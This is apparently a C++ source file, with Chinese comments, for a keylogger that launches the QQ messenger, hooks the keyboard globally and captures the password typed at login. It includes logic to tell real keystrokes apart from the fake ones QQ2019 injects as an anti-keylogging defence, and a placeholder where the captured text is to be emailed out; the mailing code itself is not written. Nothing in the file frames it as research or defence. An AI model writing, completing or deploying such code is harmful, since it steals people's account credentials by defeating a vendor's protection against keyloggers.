#include "Monitor.h"

//定义全局变量
std::string g_ResStr;
HHOOK g_KbHook;

Monitor::Monitor(TCHAR* QQPath)
{
	this->QQPath = QQPath;
}

void Monitor::Start()
{
	//创建目标进程(QQ)
	STARTUPINFO si = { 0 }; PROCESS_INFORMATION pi; si.cb = sizeof(STARTUPINFO);
	if (CreateProcess(Monitor::QQPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi) == 0x0)
	{
		printf("进程创建失败,code= %d \n", GetLastError());
		MessageBox(0, TEXT("Can't found QQ Path"), 0, 0);
		exit(0);
	}

	//设置全局钩子（低级键盘钩子）
	g_KbHook = SetWindowsHookExA(WH_KEYBOARD_LL, KeyBoardEvent, GetModuleHandleA(NULL), NULL);

	//创建子进程：等待目标进程结束，卸载钩子、发送邮件
	CreateThread(NULL, 0, WaitProcEnd, (LPVOID)& pi, 0, NULL);

	//必须在主线程中接收Windows消息，否则程序卡死
	MSG msg;
	while (GetMessage(&msg, nullptr, 0, 0))
	{
		Sleep(1);
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
}

DWORD WINAPI WaitProcEnd(LPVOID lpThreadParameter)
{
	//目标进程信息
	PROCESS_INFORMATION pi = *(PROCESS_INFORMATION*)lpThreadParameter;

	//等待子进程结束(阻塞)：输完密码登陆后,QQ第1个进程就结束了
	WaitForSingleObject(pi.hProcess, INFINITE);

	//卸载键盘钩子
	UnhookWindowsHookEx(g_KbHook);

	//发送邮件
	//Send Email ...

	//退出程序
	ExitProcess(0);
	return 0;
}

LRESULT CALLBACK KeyBoardEvent(int code, WPARAM wParam, LPARAM lParam)
{
	KBDLLHOOKSTRUCT* kbDllHookStuct = (KBDLLHOOKSTRUCT*)lParam;
	if (wParam == WM_KEYUP)
	{
		if (kbDllHookStuct->vkCode == VK_LSHIFT || kbDllHookStuct->vkCode == VK_RSHIFT)
		{
			printf("[SHIFT UP]");
			g_ResStr += "[SHIFT UP]";
			printf("---vkCode=%x scanCode=%x flags=%x time=%x dwExtraInfo=%x 系统已启动时间=%x \n", kbDllHookStuct->vkCode, kbDllHookStuct->scanCode, kbDllHookStuct->flags, kbDllHookStuct->time, kbDllHookStuct->dwExtraInfo, GetTickCount());
		}
	}

	//-----------测试1------------
	//if (wParam == WM_KEYDOWN)
	//{
	//	printf("---vkCode=%x scanCode=%x flags=%x time=%x dwExtraInfo=%x 系统已启动时间=%x \n", kbDllHookStuct->vkCode, kbDllHookStuct->scanCode, kbDllHookStuct->flags, kbDllHookStuct->time, kbDllHookStuct->dwExtraInfo, GetTickCount());
	//	return CallNextHookEx(0, code, wParam, lParam);
	//}
	//-----------测试2------------
	//if (wParam == WM_KEYDOWN && kbDllHookStuct->time == GetTickCount())
	//{
	//	printf("---vkCode=%x scanCode=%x flags=%x time=%x dwExtraInfo=%x 系统已启动时间=%x \n", kbDllHookStuct->vkCode, kbDllHookStuct->scanCode, kbDllHookStuct->flags, kbDllHookStuct->time, kbDllHookStuct->dwExtraInfo, GetTickCount());
	//	return CallNextHookEx(0, code, wParam, lParam);
	//}
	//---------------------------

	if (wParam == WM_KEYDOWN)
	{
		if (kbDllHookStuct->flags == 0x0)
		{//当flags=0时，收到的是真实键盘消息
			if (kbDllHookStuct->vkCode == VK_LSHIFT || kbDllHookStuct->vkCode == VK_RSHIFT)
			{
				cout << "[SHIFT DOWN]";
				g_ResStr += "[SHIFT DOWN]";
			}
			else if (kbDllHookStuct->vkCode == 0xA2 || kbDllHookStuct->vkCode == 0xA3)
			{
				printf("[CTRL]");
				g_ResStr += "[CTRL]";
			}
			else if (kbDllHookStuct->vkCode == 0x1B)
			{
				printf("[ESC]");
				g_ResStr += "[ESC]";
			}
			else if (kbDllHookStuct->vkCode == 0x20)
			{
				printf("[SPACE]");
				g_ResStr += "[SPACE]";
			}
			else if (kbDllHookStuct->vkCode == 0x9)
			{
				printf("[TAB]");
				g_ResStr += "[TAB]";
			}
			else if (kbDllHookStuct->vkCode == 0x14)
			{
				printf("[CapsLock]");
				g_ResStr += "[CapsLock]";
			}
			else if (kbDllHookStuct->vkCode == 0x8)
			{
				printf("[Backspace]");
				g_ResStr += "[Backspace]";
			}
			else if (kbDllHookStuct->vkCode == 0xD)
			{
				printf("[Enter]");
				g_ResStr += "[Enter]";
			}
			else if (kbDllHookStuct->vkCode >= 0x60 && kbDllHookStuct->vkCode <= 0x69)
			{//小键盘数字
				printf("%c", kbDllHookStuct->vkCode - 0x30);
				g_ResStr += (char)(kbDllHookStuct->vkCode - 0x30);
			}
			else if (kbDllHookStuct->vkCode >= 0x30 && kbDllHookStuct->vkCode <= 0x39)
			{//大键盘数字

				printf("%c", kbDllHookStuct->vkCode);
				g_ResStr += (char)kbDllHookStuct->vkCode;
			}
			else if (kbDllHookStuct->vkCode >= 0x41 && kbDllHookStuct->vkCode <= 0x5A)
			{//大键盘字母
				printf("%c", kbDllHookStuct->vkCode);
				g_ResStr += (char)kbDllHookStuct->vkCode;
			}
			else
			{
				printf("[0x%x]", kbDllHookStuct->vkCode);
				char temp[20] = { 0 };
				sprintf(temp, "[0x%x]", kbDllHookStuct->vkCode);
				g_ResStr += temp;
			}
		}
		else if (kbDllHookStuct->flags == 0x10)
		{//当flags = 0x10时，是QQ2019发送的模拟键盘消息

			DWORD sysStartedTimd = GetTickCount();//系统已启动时间（毫秒）
			if (abs((long)(kbDllHookStuct->time - sysStartedTimd)) < 0x100 && kbDllHookStuct->dwExtraInfo == 0x21)
			{//映射型假消息，特征：time时间戳==系统已启动时间 且 dwExtraInfo=0x21
				printf("fake(映射型)");
				g_ResStr += "fake(映射型)";
			}
			else
			{//定时随机假消息，特征：time时间戳!=系统已启动时间 且 dwExtraInfo=0x0
				//printf("fake(定时随机型)");
				//g_ResStr += "fake(定时随机型)";
				return CallNextHookEx(0, code, wParam, lParam);
			}
		}
		else
		{
			printf("其他消息");
			g_ResStr += "其他消息";
		}
		printf("---vkCode=%x scanCode=%x flags=%x time=%x dwExtraInfo=%x 系统已启动时间=%x \n", kbDllHookStuct->vkCode, kbDllHookStuct->scanCode, kbDllHookStuct->flags, kbDllHookStuct->time, kbDllHookStuct->dwExtraInfo, GetTickCount());
		char temp[200] = { 0 };
		sprintf(temp, "---vkCode=%x \n", kbDllHookStuct->vkCode);
		g_ResStr += temp;
	}
	//如果return 1，表示消息已处理，系统就不再向下发送消息
	return CallNextHookEx(0, code, wParam, lParam);
}
